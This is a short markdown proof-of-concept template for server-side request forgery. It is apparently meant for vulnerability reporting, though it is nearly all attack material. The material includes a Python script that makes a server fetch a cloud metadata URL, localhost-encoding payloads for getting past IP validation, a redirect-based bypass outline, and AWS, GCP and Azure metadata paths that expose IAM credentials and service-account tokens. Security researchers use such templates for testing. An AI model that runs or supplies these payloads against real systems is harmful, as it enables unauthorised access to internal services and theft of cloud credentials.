# PoC Skeleton -- SSRF

## Basic SSRF PoC

```python
#!/usr/bin/env python3
"""
CVE-CANDIDATE: SSRF in [package-name] [version]
CWE: CWE-918 (Server-Side Request Forgery)
CVSS: 7.5 HIGH
"""
import requests

# Target endpoint that makes server-side requests
target = "http://localhost:3000/api/fetch-url"

# Payload: access cloud metadata endpoint
payload = {"url": "http://169.254.169.254/latest/meta-data/"}

response = requests.post(target, json=payload)
print(f"[+] SSRF Response: {response.text}")
```

## IP Validation Bypass Payloads

```
http://2130706433/              # Decimal
http://0x7f000001/              # Hex
http://0177.0.0.1/              # Octal
http://[::1]/                   # IPv6 localhost
http://[::ffff:127.0.0.1]/     # IPv6 mapped
http://127.0.0.1.nip.io/       # DNS wildcard service
http://0.0.0.0/                 # Some systems = localhost
http://localtest.me/            # Resolves to 127.0.0.1
```

## Redirect-Based SSRF

```python
# Set up redirect server on attacker-controlled domain
# Redirects from allowed URL to internal URL
# allowed-domain.com/redirect -> http://169.254.169.254/latest/meta-data/
```

## Cloud Metadata Payloads

```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
